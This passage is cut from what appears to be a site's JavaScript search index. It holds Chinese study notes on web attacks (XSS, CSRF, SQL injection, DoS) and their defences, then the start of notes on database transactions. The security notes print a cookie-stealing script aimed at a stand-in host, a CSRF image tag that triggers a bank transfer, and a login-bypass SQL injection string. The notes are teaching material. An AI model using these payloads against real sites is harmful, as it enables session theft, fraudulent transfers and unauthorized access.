\u53C2\u8003\u8D44\u6599`},{header:"\u4E00\u3001\u8DE8\u7AD9\u811A\u672C\u653B\u51FB",slug:"\u4E00\u3001\u8DE8\u7AD9\u811A\u672C\u653B\u51FB",content:""},{header:"\u6982\u5FF5",slug:"\u6982\u5FF5",content:"\u8DE8\u7AD9\u811A\u672C\u653B\u51FB\uFF08Cross-Site Scripting, XSS\uFF09\uFF0C\u53EF\u4EE5\u5C06\u4EE3\u7801\u6CE8\u5165\u5230\u7528\u6237\u6D4F\u89C8\u7684\u7F51\u9875\u4E0A\uFF0C\u8FD9\u79CD\u4EE3\u7801\u5305\u62EC HTML \u548C JavaScript\u3002"},{header:"\u653B\u51FB\u539F\u7406",slug:"\u653B\u51FB\u539F\u7406",content:`\u4F8B\u5982\u6709\u4E00\u4E2A\u8BBA\u575B\u7F51\u7AD9\uFF0C\u653B\u51FB\u8005\u53EF\u4EE5\u5728\u4E0A\u9762\u53D1\u5E03\u4EE5\u4E0B\u5185\u5BB9\uFF1A
<script>location.href="//domain.com/?c=" + document.cookie<\/script>
\u4E4B\u540E\u8BE5\u5185\u5BB9\u53EF\u80FD\u4F1A\u88AB\u6E32\u67D3\u6210\u4EE5\u4E0B\u5F62\u5F0F\uFF1A
<p><script>location.href="//domain.com/?c=" + document.cookie<\/script></p>
\u53E6\u4E00\u4E2A\u7528\u6237\u6D4F\u89C8\u4E86\u542B\u6709\u8FD9\u4E2A\u5185\u5BB9\u7684\u9875\u9762\u5C06\u4F1A\u8DF3\u8F6C\u5230 domain.com \u5E76\u643A\u5E26\u4E86\u5F53\u524D\u4F5C\u7528\u57DF\u7684 Cookie\u3002\u5982\u679C\u8FD9\u4E2A\u8BBA\u575B\u7F51\u7AD9\u901A\u8FC7 Cookie \u7BA1\u7406\u7528\u6237\u767B\u5F55\u72B6\u6001\uFF0C\u90A3\u4E48\u653B\u51FB\u8005\u5C31\u53EF\u4EE5\u901A\u8FC7\u8FD9\u4E2A Cookie \u767B\u5F55\u88AB\u653B\u51FB\u8005\u7684\u8D26\u53F7\u4E86\u3002`},{header:"\u5371\u5BB3",slug:"\u5371\u5BB3",content:`\u7A83\u53D6\u7528\u6237\u7684 Cookie
\u4F2A\u9020\u865A\u5047\u7684\u8F93\u5165\u8868\u5355\u9A97\u53D6\u4E2A\u4EBA\u4FE1\u606F
\u663E\u793A\u4F2A\u9020\u7684\u6587\u7AE0\u6216\u8005\u56FE\u7247`},{header:"\u9632\u8303\u624B\u6BB5",slug:"\u9632\u8303\u624B\u6BB5",content:""},{header:"1. \u8BBE\u7F6E Cookie \u4E3A HttpOnly",slug:"_1-\u8BBE\u7F6E-cookie-\u4E3A-httponly",content:"\u8BBE\u7F6E\u4E86 HttpOnly \u7684 Cookie \u53EF\u4EE5\u9632\u6B62 JavaScript \u811A\u672C\u8C03\u7528\uFF0C\u5C31\u65E0\u6CD5\u901A\u8FC7 document.cookie \u83B7\u53D6\u7528\u6237 Cookie \u4FE1\u606F\u3002"},{header:"2. \u8FC7\u6EE4\u7279\u6B8A\u5B57\u7B26",slug:"_2-\u8FC7\u6EE4\u7279\u6B8A\u5B57\u7B26",content:`\u4F8B\u5982\u5C06 < \u8F6C\u4E49\u4E3A &lt;\uFF0C\u5C06 > \u8F6C\u4E49\u4E3A &gt;\uFF0C\u4ECE\u800C\u907F\u514D HTML \u548C Jascript \u4EE3\u7801\u7684\u8FD0\u884C\u3002
\u5BCC\u6587\u672C\u7F16\u8F91\u5668\u5141\u8BB8\u7528\u6237\u8F93\u5165 HTML \u4EE3\u7801\uFF0C\u5C31\u4E0D\u80FD\u7B80\u5355\u5730\u5C06 < \u7B49\u5B57\u7B26\u8FDB\u884C\u8FC7\u6EE4\u4E86\uFF0C\u6781\u5927\u5730\u63D0\u9AD8\u4E86 XSS \u653B\u51FB\u7684\u53EF\u80FD\u6027\u3002
\u5BCC\u6587\u672C\u7F16\u8F91\u5668\u901A\u5E38\u91C7\u7528 XSS filter \u6765\u9632\u8303 XSS \u653B\u51FB\uFF0C\u901A\u8FC7\u5B9A\u4E49\u4E00\u4E9B\u6807\u7B7E\u767D\u540D\u5355\u6216\u8005\u9ED1\u540D\u5355\uFF0C\u4ECE\u800C\u4E0D\u5141\u8BB8\u6709\u653B\u51FB\u6027\u7684 HTML \u4EE3\u7801\u7684\u8F93\u5165\u3002
\u4EE5\u4E0B\u4F8B\u5B50\u4E2D\uFF0Cform \u548C script \u7B49\u6807\u7B7E\u90FD\u88AB\u8F6C\u4E49\uFF0C\u800C h \u548C p \u7B49\u6807\u7B7E\u5C06\u4F1A\u4FDD\u7559\u3002
<h1 id="title">XSS Demo</h1> <p>123</p> <form> <input type="text" name="q" value="test">
</form> <pre>hello</pre> <script type="text/javascript">
alert(/xss/);
<\/script>
<h1>XSS Demo</h1> <p>123</p> &lt;form&gt; &lt;input type="text" name="q" value="test"&gt;
&lt;/form&gt; <pre>hello</pre> &lt;script type="text/javascript"&gt;
alert(/xss/);
&lt;/script&gt; XSS \u8FC7\u6EE4\u5728\u7EBF\u6D4B\u8BD5`},{header:"\u4E8C\u3001\u8DE8\u7AD9\u8BF7\u6C42\u4F2A\u9020",slug:"\u4E8C\u3001\u8DE8\u7AD9\u8BF7\u6C42\u4F2A\u9020",content:""},{header:"\u6982\u5FF5",slug:"\u6982\u5FF5-1",content:`\u8DE8\u7AD9\u8BF7\u6C42\u4F2A\u9020\uFF08Cross-site request forgery\uFF0CCSRF\uFF09\uFF0C\u662F\u653B\u51FB\u8005\u901A\u8FC7\u4E00\u4E9B\u6280\u672F\u624B\u6BB5\u6B3A\u9A97\u7528\u6237\u7684\u6D4F\u89C8\u5668\u53BB\u8BBF\u95EE\u4E00\u4E2A\u81EA\u5DF1\u66FE\u7ECF\u8BA4\u8BC1\u8FC7\u7684\u7F51\u7AD9\u5E76\u6267\u884C\u4E00\u4E9B\u64CD\u4F5C\uFF08\u5982\u53D1\u90AE\u4EF6\uFF0C\u53D1\u6D88\u606F\uFF0C\u751A\u81F3\u8D22\u4EA7\u64CD\u4F5C\u5982\u8F6C\u8D26\u548C\u8D2D\u4E70\u5546\u54C1\uFF09\u3002\u7531\u4E8E\u6D4F\u89C8\u5668\u66FE\u7ECF\u8BA4\u8BC1\u8FC7\uFF0C\u6240\u4EE5\u88AB\u8BBF\u95EE\u7684\u7F51\u7AD9\u4F1A\u8BA4\u4E3A\u662F\u771F\u6B63\u7684\u7528\u6237\u64CD\u4F5C\u800C\u53BB\u6267\u884C\u3002
XSS \u5229\u7528\u7684\u662F\u7528\u6237\u5BF9\u6307\u5B9A\u7F51\u7AD9\u7684\u4FE1\u4EFB\uFF0CCSRF \u5229\u7528\u7684\u662F\u7F51\u7AD9\u5BF9\u7528\u6237\u6D4F\u89C8\u5668\u7684\u4FE1\u4EFB\u3002`},{header:"\u653B\u51FB\u539F\u7406",slug:"\u653B\u51FB\u539F\u7406-1",content:`\u5047\u5982\u4E00\u5BB6\u94F6\u884C\u7528\u4EE5\u6267\u884C\u8F6C\u8D26\u64CD\u4F5C\u7684 URL \u5730\u5740\u5982\u4E0B\uFF1A
http://www.examplebank.com/withdraw?account=AccoutName&amount=1000&for=PayeeName\u3002
\u90A3\u4E48\uFF0C\u4E00\u4E2A\u6076\u610F\u653B\u51FB\u8005\u53EF\u4EE5\u5728\u53E6\u4E00\u4E2A\u7F51\u7AD9\u4E0A\u653E\u7F6E\u5982\u4E0B\u4EE3\u7801\uFF1A
![img](http://www.examplebank.com/withdraw?account=Alice&amount=1000&for=Badman">\u3002
\u5982\u679C\u6709\u8D26\u6237\u540D\u4E3A Alice \u7684\u7528\u6237\u8BBF\u95EE\u4E86\u6076\u610F\u7AD9\u70B9\uFF0C\u800C\u5979\u4E4B\u524D\u521A\u8BBF\u95EE\u8FC7\u94F6\u884C\u4E0D\u4E45\uFF0C\u767B\u5F55\u4FE1\u606F\u5C1A\u672A\u8FC7\u671F\uFF0C\u90A3\u4E48\u5979\u5C31\u4F1A\u635F\u5931 1000 \u7F8E\u5143\u3002
\u8FD9\u79CD\u6076\u610F\u7684\u7F51\u5740\u53EF\u4EE5\u6709\u5F88\u591A\u79CD\u5F62\u5F0F\uFF0C\u85CF\u8EAB\u4E8E\u7F51\u9875\u4E2D\u7684\u8BB8\u591A\u5730\u65B9\u3002\u6B64\u5916\uFF0C\u653B\u51FB\u8005\u4E5F\u4E0D\u9700\u8981\u63A7\u5236\u653E\u7F6E\u6076\u610F\u7F51\u5740\u7684\u7F51\u7AD9\u3002\u4F8B\u5982\u4ED6\u53EF\u4EE5\u5C06\u8FD9\u79CD\u5730\u5740\u85CF\u5728\u8BBA\u575B\uFF0C\u535A\u5BA2\u7B49\u4EFB\u4F55\u7528\u6237\u751F\u6210\u5185\u5BB9\u7684\u7F51\u7AD9\u4E2D\u3002\u8FD9\u610F\u5473\u7740\u5982\u679C\u670D\u52A1\u5668\u7AEF\u6CA1\u6709\u5408\u9002\u7684\u9632\u5FA1\u63AA\u65BD\u7684\u8BDD\uFF0C\u7528\u6237\u5373\u4F7F\u8BBF\u95EE\u719F\u6089\u7684\u53EF\u4FE1\u7F51\u7AD9\u4E5F\u6709\u53D7\u653B\u51FB\u7684\u5371\u9669\u3002
\u901A\u8FC7\u4F8B\u5B50\u80FD\u591F\u770B\u51FA\uFF0C\u653B\u51FB\u8005\u5E76\u4E0D\u80FD\u901A\u8FC7 CSRF \u653B\u51FB\u6765\u76F4\u63A5\u83B7\u53D6\u7528\u6237\u7684\u8D26\u6237\u63A7\u5236\u6743\uFF0C\u4E5F\u4E0D\u80FD\u76F4\u63A5\u7A83\u53D6\u7528\u6237\u7684\u4EFB\u4F55\u4FE1\u606F\u3002\u4ED6\u4EEC\u80FD\u505A\u5230\u7684\uFF0C\u662F\u6B3A\u9A97\u7528\u6237\u6D4F\u89C8\u5668\uFF0C\u8BA9\u5176\u4EE5\u7528\u6237\u7684\u540D\u4E49\u6267\u884C\u64CD\u4F5C\u3002`},{header:"\u9632\u8303\u624B\u6BB5",slug:"\u9632\u8303\u624B\u6BB5-1",content:""},{header:"1. \u68C0\u67E5 Referer \u9996\u90E8\u5B57\u6BB5",slug:"_1-\u68C0\u67E5-referer-\u9996\u90E8\u5B57\u6BB5",content:`Referer \u9996\u90E8\u5B57\u6BB5\u4F4D\u4E8E HTTP \u62A5\u6587\u4E2D\uFF0C\u7528\u4E8E\u6807\u8BC6\u8BF7\u6C42\u6765\u6E90\u7684\u5730\u5740\u3002\u68C0\u67E5\u8FD9\u4E2A\u9996\u90E8\u5B57\u6BB5\u5E76\u8981\u6C42\u8BF7\u6C42\u6765\u6E90\u7684\u5730\u5740\u5728\u540C\u4E00\u4E2A\u57DF\u540D\u4E0B\uFF0C\u53EF\u4EE5\u6781\u5927\u7684\u9632\u6B62 CSRF \u653B\u51FB\u3002
\u8FD9\u79CD\u529E\u6CD5\u7B80\u5355\u6613\u884C\uFF0C\u5DE5\u4F5C\u91CF\u4F4E\uFF0C\u4EC5\u9700\u8981\u5728\u5173\u952E\u8BBF\u95EE\u5904\u589E\u52A0\u4E00\u6B65\u6821\u9A8C\u3002\u4F46\u8FD9\u79CD\u529E\u6CD5\u4E5F\u6709\u5176\u5C40\u9650\u6027\uFF0C\u56E0\u5176\u5B8C\u5168\u4F9D\u8D56\u6D4F\u89C8\u5668\u53D1\u9001\u6B63\u786E\u7684 Referer \u5B57\u6BB5\u3002\u867D\u7136 HTTP \u534F\u8BAE\u5BF9\u6B64\u5B57\u6BB5\u7684\u5185\u5BB9\u6709\u660E\u786E\u7684\u89C4\u5B9A\uFF0C\u4F46\u5E76\u65E0\u6CD5\u4FDD\u8BC1\u6765\u8BBF\u7684\u6D4F\u89C8\u5668\u7684\u5177\u4F53\u5B9E\u73B0\uFF0C\u4EA6\u65E0\u6CD5\u4FDD\u8BC1\u6D4F\u89C8\u5668\u6CA1\u6709\u5B89\u5168\u6F0F\u6D1E\u5F71\u54CD\u5230\u6B64\u5B57\u6BB5\u3002\u5E76\u4E14\u4E5F\u5B58\u5728\u653B\u51FB\u8005\u653B\u51FB\u67D0\u4E9B\u6D4F\u89C8\u5668\uFF0C\u7BE1\u6539\u5176 Referer \u5B57\u6BB5\u7684\u53EF\u80FD\u3002`},{header:"2. \u6DFB\u52A0\u6821\u9A8C Token",slug:"_2-\u6DFB\u52A0\u6821\u9A8C-token",content:"\u5728\u8BBF\u95EE\u654F\u611F\u6570\u636E\u8BF7\u6C42\u65F6\uFF0C\u8981\u6C42\u7528\u6237\u6D4F\u89C8\u5668\u63D0\u4F9B\u4E0D\u4FDD\u5B58\u5728 Cookie \u4E2D\uFF0C\u5E76\u4E14\u653B\u51FB\u8005\u65E0\u6CD5\u4F2A\u9020\u7684\u6570\u636E\u4F5C\u4E3A\u6821\u9A8C\u3002\u4F8B\u5982\u670D\u52A1\u5668\u751F\u6210\u968F\u673A\u6570\u5E76\u9644\u52A0\u5728\u8868\u5355\u4E2D\uFF0C\u5E76\u8981\u6C42\u5BA2\u6237\u7AEF\u4F20\u56DE\u8FD9\u4E2A\u968F\u673A\u6570\u3002"},{header:"3. \u8F93\u5165\u9A8C\u8BC1\u7801",slug:"_3-\u8F93\u5165\u9A8C\u8BC1\u7801",content:"\u56E0\u4E3A CSRF \u653B\u51FB\u662F\u5728\u7528\u6237\u65E0\u610F\u8BC6\u7684\u60C5\u51B5\u4E0B\u53D1\u751F\u7684\uFF0C\u6240\u4EE5\u8981\u6C42\u7528\u6237\u8F93\u5165\u9A8C\u8BC1\u7801\u53EF\u4EE5\u8BA9\u7528\u6237\u77E5\u9053\u81EA\u5DF1\u6B63\u5728\u505A\u7684\u64CD\u4F5C\u3002"},{header:"\u4E09\u3001SQL \u6CE8\u5165\u653B\u51FB",slug:"\u4E09\u3001sql-\u6CE8\u5165\u653B\u51FB",content:""},{header:"\u6982\u5FF5",slug:"\u6982\u5FF5-2",content:"\u670D\u52A1\u5668\u4E0A\u7684\u6570\u636E\u5E93\u8FD0\u884C\u975E\u6CD5\u7684 SQL \u8BED\u53E5\uFF0C\u4E3B\u8981\u901A\u8FC7\u62FC\u63A5\u6765\u5B8C\u6210\u3002"},{header:"\u653B\u51FB\u539F\u7406",slug:"\u653B\u51FB\u539F\u7406-2",content:`\u4F8B\u5982\u4E00\u4E2A\u7F51\u7AD9\u767B\u5F55\u9A8C\u8BC1\u7684 SQL \u67E5\u8BE2\u4EE3\u7801\u4E3A\uFF1A
strSQL = "SELECT * FROM users WHERE (name = '" + userName + "') and (pw = '"+ passWord +"');"
\u5982\u679C\u586B\u5165\u4EE5\u4E0B\u5185\u5BB9\uFF1A
userName = "1' OR '1'='1";
passWord = "1' OR '1'='1";
\u90A3\u4E48 SQL \u67E5\u8BE2\u5B57\u7B26\u4E32\u4E3A\uFF1A
strSQL = "SELECT * FROM users WHERE (name = '1' OR '1'='1') and (pw = '1' OR '1'='1');"
\u6B64\u65F6\u65E0\u9700\u9A8C\u8BC1\u901A\u8FC7\u5C31\u80FD\u6267\u884C\u4EE5\u4E0B\u67E5\u8BE2\uFF1A
strSQL = "SELECT * FROM users;"`},{header:"\u9632\u8303\u624B\u6BB5",slug:"\u9632\u8303\u624B\u6BB5-2",content:""},{header:"1. \u4F7F\u7528\u53C2\u6570\u5316\u67E5\u8BE2",slug:"_1-\u4F7F\u7528\u53C2\u6570\u5316\u67E5\u8BE2",content:`Java \u4E2D\u7684 PreparedStatement \u662F\u9884\u5148\u7F16\u8BD1\u7684 SQL \u8BED\u53E5\uFF0C\u53EF\u4EE5\u4F20\u5165\u9002\u5F53\u53C2\u6570\u5E76\u4E14\u591A\u6B21\u6267\u884C\u3002\u7531\u4E8E\u6CA1\u6709\u62FC\u63A5\u7684\u8FC7\u7A0B\uFF0C\u56E0\u6B64\u53EF\u4EE5\u9632\u6B62 SQL \u6CE8\u5165\u7684\u53D1\u751F\u3002
PreparedStatement stmt = connection.prepareStatement("SELECT * FROM users WHERE userid=? AND password=?");
stmt.setString(1, userid);
stmt.setString(2, password);
ResultSet rs = stmt.executeQuery();`},{header:"2. \u5355\u5F15\u53F7\u8F6C\u6362",slug:"_2-\u5355\u5F15\u53F7\u8F6C\u6362",content:"\u5C06\u4F20\u5165\u7684\u53C2\u6570\u4E2D\u7684\u5355\u5F15\u53F7\u8F6C\u6362\u4E3A\u8FDE\u7EED\u4E24\u4E2A\u5355\u5F15\u53F7\uFF0CPHP \u4E2D\u7684 Magic quote \u53EF\u4EE5\u5B8C\u6210\u8FD9\u4E2A\u529F\u80FD\u3002"},{header:"\u56DB\u3001\u62D2\u7EDD\u670D\u52A1\u653B\u51FB",slug:"\u56DB\u3001\u62D2\u7EDD\u670D\u52A1\u653B\u51FB",content:`\u62D2\u7EDD\u670D\u52A1\u653B\u51FB\uFF08denial-of-service attack\uFF0CDoS\uFF09\uFF0C\u4EA6\u79F0\u6D2A\u6C34\u653B\u51FB\uFF0C\u5176\u76EE\u7684\u5728\u4E8E\u4F7F\u76EE\u6807\u7535\u8111\u7684\u7F51\u7EDC\u6216\u7CFB\u7EDF\u8D44\u6E90\u8017\u5C3D\uFF0C\u4F7F\u670D\u52A1\u6682\u65F6\u4E2D\u65AD\u6216\u505C\u6B62\uFF0C\u5BFC\u81F4\u5176\u6B63\u5E38\u7528\u6237\u65E0\u6CD5\u8BBF\u95EE\u3002
\u5206\u5E03\u5F0F\u62D2\u7EDD\u670D\u52A1\u653B\u51FB\uFF08distributed denial-of-service attack\uFF0CDDoS\uFF09\uFF0C\u6307\u653B\u51FB\u8005\u4F7F\u7528\u4E24\u4E2A\u6216\u4EE5\u4E0A\u88AB\u653B\u9677\u7684\u7535\u8111\u4F5C\u4E3A\u201C\u50F5\u5C38\u201D\u5411\u7279\u5B9A\u7684\u76EE\u6807\u53D1\u52A8\u201C\u62D2\u7EDD\u670D\u52A1\u201D\u5F0F\u653B\u51FB\u3002`},{header:"\u53C2\u8003\u8D44\u6599",slug:"\u53C2\u8003\u8D44\u6599",content:`\u7EF4\u57FA\u767E\u79D1\uFF1A\u8DE8\u7AD9\u811A\u672C
\u7EF4\u57FA\u767E\u79D1\uFF1ASQL \u6CE8\u5165\u653B\u51FB
\u7EF4\u57FA\u767E\u79D1\uFF1A\u8DE8\u7AD9\u70B9\u8BF7\u6C42\u4F2A\u9020
\u7EF4\u57FA\u767E\u79D1\uFF1A\u62D2\u7EDD\u670D\u52A1\u653B\u51FB`}]},{path:"/java/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86.html",title:"\u6570\u636E\u5E93\u7CFB\u7EDF\u539F\u7406",pathLocale:"/",contents:[{header:"\u6570\u636E\u5E93\u7CFB\u7EDF\u539F\u7406",slug:"\u6570\u636E\u5E93\u7CFB\u7EDF\u539F\u7406",content:`\u6570\u636E\u5E93\u7CFB\u7EDF\u539F\u7406 \u4E00\u3001\u4E8B\u52A1 \u6982\u5FF5
ACID 1. \u539F\u5B50\u6027\uFF08Atomicity\uFF09
2. \u4E00\u81F4\u6027\uFF08Consistency\uFF09
3. \u9694\u79BB\u6027\uFF08Isolation\uFF09
4. \u6301\u4E45\u6027\uFF08Durability\uFF09 AUTOCOMMIT \u4E8C\u3001\u5E76\u53D1\u4E00\u81F4\u6027\u95EE\u9898 \u4E22\u5931\u4FEE\u6539
\u8BFB\u810F\u6570\u636E
\u4E0D\u53EF\u91CD\u590D\u8BFB
\u5E7B\u5F71\u8BFB \u4E09\u3001\u5C01\u9501 \u5C01\u9501\u7C92\u5EA6
\u5C01\u9501\u7C7B\u578B 1. \u8BFB\u5199\u9501
2. \u610F\u5411\u9501 \u5C01\u9501\u534F\u8BAE 1. \u4E09\u7EA7\u5C01\u9501\u534F\u8BAE
2. \u4E24\u6BB5\u9501\u534F\u8BAE MySQL \u9690\u5F0F\u4E0E\u663E\u5F0F\u9501\u5B9A \u56DB\u3001\u9694\u79BB\u7EA7\u522B \u672A\u63D0\u4EA4\u8BFB\uFF08READ UNCOMMITTED\uFF09
\u63D0\u4EA4\u8BFB\uFF08READ COMMITTED\uFF09
\u53EF\u91CD\u590D\u8BFB\uFF08REPEATABLE READ\uFF09
\u53EF\u4E32\u884C\u5316\uFF08SERIALIZABLE\uFF09 \u4E94\u3001\u591A\u7248\u672C\u5E76\u53D1\u63A7\u5236 \u57FA\u672C\u601D\u60F3
\u7248\u672C\u53F7
Undo \u65E5\u5FD7
ReadView
\u5FEB\u7167\u8BFB\u4E0E\u5F53\u524D\u8BFB 1. \u5FEB\u7167\u8BFB
2. \u5F53\u524D\u8BFB \u516D\u3001Next-Key Locks Record Locks
Gap Locks
Next-Key Locks \u4E03\u3001\u5173\u7CFB\u6570\u636E\u5E93\u8BBE\u8BA1\u7406\u8BBA \u51FD\u6570\u4F9D\u8D56
\u5F02\u5E38
\u8303\u5F0F 1. \u7B2C\u4E00\u8303\u5F0F (1NF)
2. \u7B2C\u4E8C\u8303\u5F0F (2NF)
3. \u7B2C\u4E09\u8303\u5F0F (3NF) \u516B\u3001ER \u56FE \u5B9E\u4F53\u7684\u4E09\u79CD\u8054\u7CFB
\u8868\u793A\u51FA\u73B0\u591A\u6B21\u7684\u5173\u7CFB
\u8054\u7CFB\u7684\u591A\u5411\u6027
\u8868\u793A\u5B50\u7C7B \u53C2\u8003\u8D44\u6599`},{header:"\u4E00\u3001\u4E8B\u52A1",slug:"\u4E00\u3001\u4E8B\u52A1",content:""},{header:"\u6982\u5FF5",slug:"\u6982\u5FF5",content:"\u4E8B\u52A1\u6307\u7684\u662F\u6EE1\u8DB3 ACID \u7279\u6027\u7684\u4E00\u7EC4\u64CD\u4F5C\uFF0C\u53EF\u4EE5\u901A\u8FC7 Commit \u63D0\u4EA4\u4E00\u4E2A\u4E8B\u52A1\uFF0C\u4E5F\u53EF\u4EE5\u4F7F\u7528 Rollback \u8FDB\u884C\u56DE\u6EDA\u3002"},{header:"ACID",slug:"acid",content:""},{header:"1. \u539F\u5B50\u6027\uFF08Atomicity\uFF09",slug:"_1-\u539F\u5B50\u6027-atomicity",content:`\u4E8B\u52A1\u88AB\u89C6\u4E3A\u4E0D\u53EF\u5206\u5272\u7684\u6700\u5C0F\u5355\u5143\uFF0C\u4E8B\u52A1\u7684\u6240\u6709\u64CD\u4F5C\u8981\u4E48\u5168\u90E8\u63D0\u4EA4\u6210\u529F\uFF0C\u8981\u4E48\u5168\u90E8\u5931\u8D25\u56DE\u6EDA\u3002
\u56DE\u6EDA\u53EF\u4EE5\u7528\u56DE\u6EDA\u65E5\u5FD7\uFF08Undo Log\uFF09\u6765\u5B9E\u73B0\uFF0C\u56DE\u6EDA\u65E5\u5FD7\u8BB0\u5F55\u7740\u4E8B\u52A1\u6240\u6267\u884C\u7684\u4FEE\u6539\u64CD\u4F5C\uFF0C\u5728\u56DE\u6EDA\u65F6\u53CD\u5411\u6267\u884C\u8FD9\u4E9B\u4FEE\u6539\u64CD\u4F5C\u5373\u53EF\u3002`},{header:"2. \u4E00\u81F4\u6027\uFF08Consistency\uFF09",slug:"_2-\u4E00\u81F4\u6027-consistency",content:"\u6570\u636E\u5E93\u5728\u4E8B\u52A1\u6267\u884C\u524D\u540E\u90FD\u4FDD\u6301\u4E00\u81F4\u6027\u72B6\u6001\u3002\u5728\u4E00\u81F4\u6027\u72B6\u6001\u4E0B\uFF0C\u6240\u6709\u4E8B\u52A1\u5BF9\u540C\u4E00\u4E2A\u6570\u636E\u7684\u8BFB\u53D6\u7ED3\u679C\u90FD\u662F\u76F8\u540C\u7684\u3002"},{header:"3. \u9694\u79BB\u6027\uFF08Isolation\uFF09",slug:"_3-\u9694\u79BB\u6027-isolation",content:"\u4E00\u4E2A\u4E8B\u52A1\u6240\u505A\u7684\u4FEE\u6539\u5728\u6700\u7EC8\u63D0\u4EA4\u4EE5\u524D\uFF0C\u5BF9\u5176\u5B83\u4E8B\u52A1\u662F\u4E0D\u53EF\u89C1\u7684\u3002"},{header:"4. \u6301\u4E45\u6027\uFF08Durability\uFF09",slug:"_4-\u6301\u4E45\u6027-durability",content:`\u4E00\u65E6\u4E8B\u52A1\u63D0\u4EA4\uFF0C\u5219\u5176\u6240\u505A\u7684\u4FEE\u6539\u5C06\u4F1A\u6C38\u8FDC\u4FDD\u5B58\u5230\u6570\u636E\u5E93\u4E2D\u3002\u5373\u4F7F\u7CFB\u7EDF\u53D1\u751F\u5D29\u6E83\uFF0C\u4E8B\u52A1\u6267\u884C\u7684\u7ED3\u679C\u4E5F\u4E0D\u80FD\u4E22\u5931\u3002
\u7CFB\u7EDF\u53D1\u751F\u5D29\u6E83\u53EF\u4EE5\u7528\u91CD\u505A\u65E5\u5FD7\uFF08Redo Log\uFF09\u8FDB\u884C\u6062\u590D\uFF0C\u4ECE\u800C\u5B9E\u73B0\u6301\u4E45\u6027\u3002\u4E0E\u56DE\u6EDA\u65E5\u5FD7\u8BB0\u5F55\u6570\u636E\u7684\u903B\u8F91\u4FEE\u6539\u4E0D\u540C\uFF0C\u91CD\u505A\u65E5\u5FD7\u8BB0\u5F55\u7684\u662F\u6570\u636E\u9875\u7684\u7269\u7406\u4FEE\u6539\u3002 \u4E8B\u52A1\u7684 ACID \u7279\u6027\u6982\u5FF5\u7B80\u5355\uFF0C\u4F46\u4E0D\u662F\u5F88\u597D\u7406\u89E3\uFF0C\u4E3B\u8981\u662F\u56E0\u4E3A\u8FD9\u51E0\u4E2A\u7279\u6027\u4E0D\u662F\u4E00\u79CD\u5E73\u7EA7\u5173\u7CFB\uFF1A \u53EA\u6709\u6EE1\u8DB3\u4E00\u81F4\u6027\uFF0C\u4E8B\u52A1\u7684\u6267\u884C\u7ED3\u679C\u624D\u662F\u6B63\u786E\u7684\u3002
\u5728\u65E0\u5E76\u53D1\u7684\u60C5\u51B5\u4E0B\uFF0C\u4E8B\u52A1\u4E32\u884C\u6267\u884C\uFF0C\u9694\u79BB\u6027\u4E00\u5B9A\u80FD\u591F\u6EE1\u8DB3\u3002\u6B64\u65F6\u53EA\u8981\u80FD\u6EE1\u8DB3\u539F\u5B50\u6027\uFF0C\u5C31\u4E00\u5B9A\u80FD\u6EE1\u8DB3\u4E00\u81F4\u6027\u3002
\u5728\u5E76\u53D1\u7684\u60C5\u51B5\u4E0B\uFF0C\u591A\u4E2A\u4E8B\u52A1\u5E76\u884C\u6267\u884C\uFF0C\u4E8B\u52A1\u4E0D\u4EC5\u8981\u6EE1\u8DB3\u539F\u5B50\u6027\uFF0C\u8FD8\u9700\u8981\u6EE1\u8DB3\u9694\u79BB\u6027\uFF0C\u624D\u80FD\u6EE1\u8DB3\u4E00\u81F4\u6027\u3002
\u4E8B\u52A1\u6EE1\u8DB3\u6301\u4E45\u5316\u662F\u4E3A\u4E86\u80FD\u5E94\u5BF9\u7CFB\u7EDF\u5D29\u6E83\u7684\u60C5\u51B5\u3002`},{header:"AUTOCOMMIT",slug:"autocommit",content:"MySQL \u9ED8\u8BA4\u91C7\u7528\u81EA\u52A8\u63D0\u4EA4\u6A21\u5F0F\u3002\u4E5F\u5C31\u662F\u8BF4\uFF0C\u5982\u679C\u4E0D\u663E\u5F0F\u4F7F\u7528START TRANSACTION\u8BED\u53E5\u6765\u5F00\u59CB\u4E00\u4E2A\u4E8B\u52A1\uFF0C\u90A3\u4E48\u6BCF\u4E2A\u67E5\u8BE2\u64CD\u4F5C\u90FD\u4F1A\u88AB\u5F53\u505A\u4E00\u4E2A\u4E8B\u52A1\u5E76\u81EA\u52A8\u63D0\u4EA4\u3002"},{header:"\u4E8C\u3001\u5E76\u53D1\u4E00\u81F4\u6027\u95EE\u9898",slug:"\u4E8C\u3001\u5E76\u53D1\u4E00\u81F4\u6027\u95EE\u9898",content:"\u5728\u5E76\u53D1\u73AF\u5883\u4E0B\uFF0C\u4E8B\u52A1\u7684\u9694\u79BB\u6027\u5F88\u96BE\u4FDD\u8BC1\uFF0C\u56E0\u6B64\u4F1A\u51FA\u73B0\u5F88\u591A\u5E76\u53D1\u4E00\u81F4\u6027\u95EE\u9898\u3002"},{header:"\u4E22\u5931\u4FEE\u6539",slug:"\u4E22\u5931\u4FEE\u6539",content:"\u4E22\u5931\u4FEE\u6539\u6307\u4E00\u4E2A\u4E8B\u52A1\u7684\u66F4\u65B0\u64CD\u4F5C\u88AB\u53E6\u5916\u4E00\u4E2A\u4E8B\u52A1\u7684\u66F4\u65B0\u64CD\u4F5C\u66FF\u6362\u3002\u4E00\u822C\u5728\u73B0\u5B9E\u751F\u6D3B\u4E2D\u5E38\u4F1A\u9047\u5230\uFF0C\u4F8B\u5982\uFF1AT^1^ \u548C T^2^ \u4E24\u4E2A\u4E8B\u52A1\u90FD\u5BF9\u4E00\u4E2A\u6570\u636E\u8FDB\u884C\u4FEE\u6539\uFF0CT^1^ \u5148\u4FEE\u6539\u5E76\u63D0\u4EA4\u751F\u6548\uFF0CT^2^ \u968F\u540E\u4FEE\u6539\uFF0CT^2^ \u7684\u4FEE\u6539\u8986\u76D6\u4E86 T^1^ \u7684\u4FEE\u6539\u3002"},{header:"\u8BFB\u810F\u6570\u636E",slug:"\u8BFB\u810F\u6570\u636E",content:"\u8BFB\u810F\u6570\u636E\u6307\u5728\u4E0D\u540C\u7684\u4E8B\u52A1\u4E0B\uFF0C\u5F53\u524D\u4E8B\u52A1\u53EF\u4EE5\u8BFB\u5230\u53E6\u5916\u4E8B\u52A1\u672A\u63D0\u4EA4\u7684\u6570\u636E\u3002\u4F8B\u5982\uFF1AT^1^ \u4FEE\u6539\u4E00\u4E2A\u6570\u636E\u4F46\u672A\u63D0\u4EA4\uFF0CT^2^ \u968F\u540E\u8BFB\u53D6\u8FD9\u4E2A\u6570\u636E\u3002\u5982\u679C T^1^ 